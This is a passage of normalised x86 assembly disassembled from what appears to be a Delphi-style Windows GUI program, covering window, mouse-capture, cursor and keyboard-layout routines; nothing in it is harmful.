call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45863c
sub_459e7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a144
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43bce4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45c31c
xor edx edx
push ebp
push sub_45a127
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_414184
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45b34c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_454254
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45a105
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_459dcc
xor edx edx
push ebp
push sub_45a064
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459d2c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45d128
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_443c60
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a06b
mov eax [ ebp - 0x4 ]
call sub_459dc4
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45a06b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a10f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45b34c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45b34c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_414100
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4142a4
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_454308
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45a154
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45a154
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_440954
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45a1c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45a154
pop ecx
mov eax [ esi + 0x34 ]
call sub_44f6ac
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44f6bc
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45a248
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441fb0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403320
sub_45a26c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403320
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45a29c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45a26c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45a29c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a318
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45a26c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45a26c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45a29c
pop ecx
test al al
je r-xdata
sub_45a36c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403320
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45a39c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45a36c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45a39c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a418
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45a36c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45a36c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45a39c
pop ecx
test al al
je r-xdata
sub_45a46c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_414108
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44983c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45a4c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45a46c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403320
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a53c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41b20c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45a578
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43d968
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43e62c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a5c0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_443c60
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_443c60
push eax
call RedrawWindow
sub_45a714
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4554c4
mov dl 0x5
mov eax ebx
call sub_457238
mov dl 0x1
mov eax ebx
call sub_44283c
mov dl 0x3
mov eax ebx
call sub_457534
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_45a77c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45a853
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4426fc
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442568
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43c998
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d3f8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403fe8
mov eax [ ebp - 0xc ]
call sub_4041b8
push eax
mov eax [ ebp - 0xc ]
call sub_4043b8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43d408
mov eax [ ebp - 0xc ]
call sub_4041b8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a85a
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov dl 0x1
mov eax esi
call sub_4568b8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43d4b4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404544
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45a880
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_440990
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_455fdc
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_440954
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403320
inc ebp
dec edi
jne r-xdata
sub_45a8cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4426fc
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45a8f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442f04
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45a920
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_458c88
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_4426fc
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443c60
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_442710
or ecx 0xffffffff
mov dl 0x1
call sub_43db20
pop esi
pop ebx
retn
sub_45a9b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443374
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43e62c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43ce24
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403320
sub_45aa10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45aad6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43d3f8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403fe8
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43d408
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43d4b4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aadd
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4568b8
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404544
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45aafc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4430f4
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4426fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_442710
mov dl [ ebx + 0x57 ]
call sub_43d3a4
inc edi
dec esi
jne r-xdata
sub_45aba0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45abd0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45ac00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41aa7c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45afa4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45afb0
mov eax ebx
call sub_45afbc
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4573d8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45b3dc
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45b2b8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45b2b8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45b2b8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_45ad58
push ebx
push esi
push edi
push ebp
call sub_4034b0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403124
mov eax [ ebp + 0x88 ]
call sub_403124
mov eax [ ebp + 0x84 ]
call sub_403124
mov eax [ ebp + 0x54 ]
call sub_403124
mov eax [ ebp + 0x50 ]
call sub_403124
mov eax [ ebp + 0x4c ]
call sub_403124
mov eax [ ebp + 0x30 ]
call sub_403124
mov eax [ ebp + 0x34 ]
call sub_403124
mov eax [ ebp + 0x7c ]
call sub_403124
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403124
mov eax ebp
call sub_45b018
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41aac8
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403498
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_414108
call sub_403124
inc edi
dec esi
jne r-xdata
sub_45aed0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45af1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413fac
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413fac
mov eax [ rw-data ]
call sub_45dca8
sub_45af54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4142a4
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4142a4
mov eax [ rw-data ]
call sub_45dca8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_445184
sub_45afbc
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45b074
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45b018
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402704
mov ebx esi
test ebx ebx
jne r-xdata
sub_45b074
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026e4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45b09c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b247
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b24e
lea eax [ ebp - 0x260 ]
call sub_403ef8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403ef8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4165b0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
